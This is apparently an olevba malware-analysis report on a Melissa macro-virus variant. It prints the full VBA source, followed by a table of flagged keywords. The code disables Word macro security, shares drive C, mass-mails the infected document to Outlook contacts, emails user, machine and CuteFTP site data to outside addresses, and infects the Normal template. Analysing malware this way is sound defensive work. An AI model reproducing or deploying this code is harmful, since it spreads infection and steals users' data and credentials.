olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.m-a7de7fb178837e1706c6beec966e0b5304ac2491
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MelissaFX.cls 
in file: Virus.MSWord.Melissa.m-a7de7fb178837e1706c6beec966e0b5304ac2491 - OLE stream: 'Macros/VBA/MelissaFX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegFlushKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Sub Document_Close()
Randomize
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (5 - 5): Options.VirusProtection = (5 - 5): Options.SaveNormalPrompt = (5 - 5)
End If
ShareDriveC
DisableCtrlAltDelete (True)
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissaFX") <> 1 Then _
DoMail (Int(Rnd * 30) + 30) / 100, True
DoInf
DisableCtrlAltDelete (False)
End Sub
Private Function DisableCtrlAltDelete(bDisabled As Boolean)
    x = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Function
Private Function DoMail(Percent, Info As Boolean)
Dim UDasOutlook, DasMapiName, MyMail, MyInfo, oFolder
Set UDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UDasOutlook.GetNamespace("MAPI")
If UDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        Set MyMail = UDasOutlook.CreateItem(0)
        TotList = AddyBook.AddressEntries.Count
        If TotList > 10 Then
         TotMail = Int(TotList * Percent)
         tmp = TotMail - 1
         AdrBegin = Int(Rnd * (TotList - tmp)) + 1
         AdrStop = AdrBegin + tmp
        Else
         AdrBegin = 1
         AdrStop = TotList
        End If
        For x = AdrBegin To AdrStop
            EAdr = AddyBook.AddressEntries(x)
            MyMail.Recipients.Add EAdr
        Next x
          Set oFolder = DasMapiName.GetDefaultFolder(6)
          RNItem = Int(Rnd * oFolder.items.Count) + 1
        With MyMail
         .Attachments.Add ActiveDocument.FullName
         .Importance = Int(Rnd * 2) + 1
         .DeleteAfterSubmit = True
          If oFolder.items.Count > 0 And Int(Rnd * 3) + 1 > 1 Then _
         .body = oFolder.items(RNItem).body
         .Subject = SmartSubj
         .Send
        End With
    Next y
    If Info = True Then
     DefltCuteFTP = "c:\progra~1\cuteftp\tree.dat"
        If Dir(DefltCuteFTP) = "" Then
         With Application.FileSearch
          .FileName = "tree.dat"
          .LookIn = "c:\progra~1\"
          .SearchSubFolders = True
          .Execute
          CuteFTP = .FoundFiles(1)
         End With
        Else
          CuteFTP = DefltCuteFTP
        End If
        If CuteFTP <> "" Then
         tmpkey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
         tmpkey2 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\"
         Usr = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "Username")
         PC = System.PrivateProfileString("", tmpkey2 & "ComputerName\ComputerName", "ComputerName")
         Org = System.PrivateProfileString("", tmpkey, "RegisteredOrganization")
         TZone = System.PrivateProfileString("", tmpkey2 & "TimeZoneInformation", "StandardName")
         Set MyInfo = UDasOutlook.CreateItem(0)
         With MyInfo
          .Recipients.Add "infx" & "@iname.com"
          .Recipients.Add "fafx" & "@fastermail.com"
          .Recipients.Add "apfx" & "@apexmail.com"
          .DeleteAfterSubmit = True
          .Subject = "Usr:" & Usr & " - PC:" & PC & " - Org:" & Org & " - Zone:" & TZone & " (" & ActiveDocument.Name & ")"
          .Attachments.Add CuteFTP
          .Send
         End With
    End If
    End If
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissaFX") = 1
End Function
Private Function SmartSubj()
Dim Word(1 To 3, 1 To 6) As String
Word(1, 1) = "Hello!": Word(2, 1) = "Hi,"
Word(1, 2) = "Here": Word(2, 2) = "I think this": Word(3, 2) = "Gee...Guess this"
Word(1, 3) = "is": Word(2, 3) = "used to be": Word(3, 3) = "are"
Word(1, 4) = "that": Word(2, 4) = "the": Word(3, 4) = "your"
Word(1, 5) = "file": Word(2, 5) = "document": Word(3, 5) = ".doc"
Word(1, 6) = "you requested": Word(2, 6) = "they asked"
For i = 1 To 6
x = Int(Rnd * 3) + 1
SmartSubj = SmartSubj & Word(x, i) & " "
Next i
End Function
Private Function DoInf()
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 1
If ADI1.Name <> "MelissaFX" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "MelissaFX"
DoAD = True
End If
If NTI1.Name <> "MelissaFX" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "MelissaFX"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Close()"
ToInfect.CodeModule.DeleteLines ADCL - 3
ToInfect.CodeModule.InsertLines ADCL - 3, "Document_Close"
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Open()"
ToInfect.CodeModule.DeleteLines NTCL - 3
ToInfect.CodeModule.InsertLines NTCL - 3, "Document_Open"
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Function
Private Function ShareDriveC()
 ValString = 1
 ValBinary = 3
 ValDWord = 4
 HKEY_LOCAL_MACHINE = &H80000002
 Key1 = "Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Flags", ValDWord, "770"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm1enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm2enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Path", ValString, "C:\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Remark", ValString, "MelissaFX"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Type", ValDWord, "0"
End Function
Private Sub WriteRegistry(ByVal Group As Long, ByVal Section As String, ByVal Key As String, ByVal ValType As Long, ByVal Value As Variant)
Dim lResult As Long
Dim lKeyValue As Long
Dim InLen As Long
Dim lNewVal As Long
Dim sNewVal As String
On Error Resume Next
lResult = RegCreateKey(Group, Section, lKeyValue)
If ValType = 4 Or ValType = 3 Then
   lNewVal = CLng(Value)
   If ValType = 4 Then InLen = 4
   lResult = RegSetValueExLong(lKeyValue, Key, 0&, ValType, lNewVal, InLen)
Else
   If ValType = 1 Then Value = Value + Chr(0)
   sNewVal = Value
   InLen = Len(sNewVal)
   lResult = RegSetValueExString(lKeyValue, Key, 0&, 1&, sNewVal, InLen)
End If
lResult = RegFlushKey(lKeyValue)
lResult = RegCloseKey(lKeyValue)
End Sub
Private Sub ViewVBCode()
End Sub
Private Sub AutoExit()
Document_Close
Document_Close
'Melissa modified, !helob aisyalaM

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

